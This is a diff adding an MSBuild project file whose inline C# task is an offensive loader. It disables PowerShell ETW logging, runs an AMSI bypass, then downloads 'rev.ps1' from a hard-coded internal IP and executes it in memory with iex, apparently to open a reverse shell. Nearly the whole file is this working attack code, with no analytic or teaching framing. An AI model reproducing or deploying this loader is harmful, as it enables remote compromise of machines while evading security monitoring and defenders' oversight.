@@ -1,0 +1,92 @@
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
+    <ItemGroup>
+      <Reference Include="System" />
+      <Reference Include="System.Core" />
+      <Reference Include="System.Xml.Linq" />
+      <Reference Include="System.Data.DataSetExtensions" />
+      <Reference Include="Microsoft.CSharp" />
+      <Reference Include="System.Data" />
+      <Reference Include="System.Net" />
+      <Reference Include="System.Xml" />
+    </ItemGroup>
+
+    <Target Name="Hello">
+      <ClassExample PayloadUrl="http://192.168.88.176/rev.ps1" />
+    </Target>
+
+    <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+      <ParameterGroup>
+        <PayloadUrl Required="true" ParameterType="System.String" />
+      </ParameterGroup>
+      <Task>
+        <Using Namespace="System" />
+        <Using Namespace="System.IO" />
+        <Using Namespace="System.Text" />
+        <Using Namespace="System.Reflection" />
+        <Using Namespace="Microsoft.CSharp" />
+        <Using Namespace="System.Runtime.InteropServices" />
+        <Using Namespace="Microsoft.Build.Framework" />
+        <Using Namespace="Microsoft.Build.Utilities" />
+        <Using Namespace="System.Security.Cryptography" />
+        <Using Namespace="System.Net" />
+        <Using Namespace="System.Management.Automation" />
+        <Using Namespace="System.Management.Automation.Runspaces" />
+        <Using Namespace="System.Collections.ObjectModel" />
+
+        <Reference Include="System.Management.Automation" />
+
+        <Code Type="Class" Language="cs">
+        <![CDATA[
+            using System;
+            using System.IO;
+            using System.Text;
+            using System.Reflection;
+            using Microsoft.CSharp;
+            using System.Runtime.InteropServices;
+            using Microsoft.Build.Framework;
+            using Microsoft.Build.Utilities;
+            using System.Security.Cryptography;
+            using System.Net;
+            using System.Management.Automation;
+            using System.Management.Automation.Runspaces;
+            using System.Collections.ObjectModel;
+
+            public class ClassExample : Task, ITask
+            {
+                [Required]
+                public string PayloadUrl { get; set; }
+
+                public override bool Execute()
+                {
+                    Runspace rs = RunspaceFactory.CreateRunspace();
+                    rs.Open();
+
+                    PowerShell ps = PowerShell.Create();
+                    ps.Runspace = rs;
+
+                    // --- AMSI bypass ---
+                    var PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
+                    if (PSEtwLogProvider != null) {
+                        var EtwProvider = PSEtwLogProvider.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static);
+                        var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
+                        EtwProvider.SetValue(null, EventProvider);
+                    }
+            String cmdo = "$a = 'System.Management.Automation.A';$b = 'msiUtils';$c = [Ref].Assembly.GetType($a+$b);$d = $c.GetField('amsiInitFailed','NonPublic,Static');$d = $c.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');";
+            ps.AddScript(cmdo);
+            ps.Invoke();
+                    ps.Commands.Clear();
+
+                    // --- Fetch rev.ps1 via HTTP and run it in-memory dengan IEX ---
+                    string cmd = "iex (New-Object Net.WebClient).DownloadString('" + PayloadUrl + "')";
+                    ps.AddScript(cmd);
+                    ps.Invoke();
+
+                    rs.Close();
+                    return true;
+                }
+            }
+            ]]>
+        </Code>
+      </Task>
+    </UsingTask>
+</Project>
